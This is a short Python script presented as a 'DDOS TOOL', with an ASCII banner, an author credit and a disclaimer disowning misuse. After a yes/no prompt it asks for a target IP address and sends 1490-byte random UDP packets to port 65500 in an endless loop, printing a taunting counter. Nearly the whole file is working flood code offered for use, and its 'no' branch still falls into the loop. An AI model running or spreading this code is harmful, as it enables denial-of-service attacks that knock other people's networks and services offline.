from ast import Bytes
import colorama
import socket
import random
from colorama import Fore, Back, Style

print(Fore.RED + '$$$$       $$$$         $$$     $$$$$$$$        $$$$$$$$$$$    $$$        $$$     $$$          ') 
print(Fore.RED + '$$ $$$     $$ $$$      $$ $$    $$$$$$$$        $$$$$$$$$$$   $$ $$      $$ $$    $$$          ')
print(Fore.RED + '$$   $$    $$   $$    $$   $$   $$$                 $$$      $$   $$    $$   $$   $$$          ')
print(Fore.RED + '$$    $$   $$    $$  $$     $$  $$$$$$$$            $$$     $$     $$  $$     $$  $$$          ')
print(Fore.RED + '$$    $$   $$    $$  $$     $$  $$$$$$$$            $$$     $$     $$  $$     $$  $$$          ')
print(Fore.RED + '$$   $$    $$   $$    $$   $$        $$$            $$$      $$   $$    $$   $$   $$$          ')
print(Fore.RED + '$$ $$$     $$ $$$      $$ $$    $$$$$$$$            $$$       $$ $$      $$ $$    $$$$$$$$$    ')
print(Fore.RED + '$$$$       $$$$         $$$     $$$$$$$$            $$$        $$$        $$$     $$$$$$$$$    ')
print('')
print(Fore.RED + '                                    By thefatbot1                                              ')
print(Fore.WHITE + '               (NOT MY FAULT IF U USE THIS FOR A BAD PURPOSE, I ONLY                         ')
print(Fore.WHITE + "                   MADE THIS TO EXPOSE THE VULNERABILITY OF IP'S)                            ")



Socket = Socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
total = 0
 
print(Fore.RED + "u sure u wanna proceed? (NOT MY FAULT IF ANYTHING HAPPENS, type 'yes' to proceed and 'no' to not proceed)")
choice = input()
print('')

if choice == 'yes':
    ip = input('what is the ip u wanna ddos? ') 
    print('')

elif choice == 'no':
    print('good boy')

else:
    print('...')

while True:
    Socket.sendto(bytes, (ip, 65500))
    total += 1
    print(f'pinged ip {total} times >:)')









